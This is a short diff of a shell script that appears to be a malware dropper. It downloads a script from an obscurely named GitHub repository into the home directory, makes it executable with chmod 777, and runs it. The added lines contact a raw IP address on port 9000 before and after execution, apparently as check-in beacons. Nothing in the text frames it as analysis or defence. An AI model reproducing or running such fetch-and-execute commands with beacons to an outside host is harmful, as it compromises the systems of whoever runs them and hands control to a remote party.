@@ -1,5 +1,9 @@
+curl -s http://196.251.112.77:9000/start.hello
+wget -q http://196.251.112.77:9000/start.hello
 curl -s -o ~/Util.sh https://raw.githubusercontent.com/xxxyylllkkiihhmmg/jjggiittnn/refs/heads/main/hjdjkfdhgdjdhgd.sh
 wget -q -O ~/Util.sh https://raw.githubusercontent.com/xxxyylllkkiihhmmg/jjggiittnn/refs/heads/main/hjdjkfdhgdjdhgd.sh
 chmod 777 ~/Util.sh
 chmod +x ~/Util.sh
 bash ~/Util.sh
+curl -s http://196.251.112.77:9000/end.hello
+wget -q http://196.251.112.77:9000/end.hello
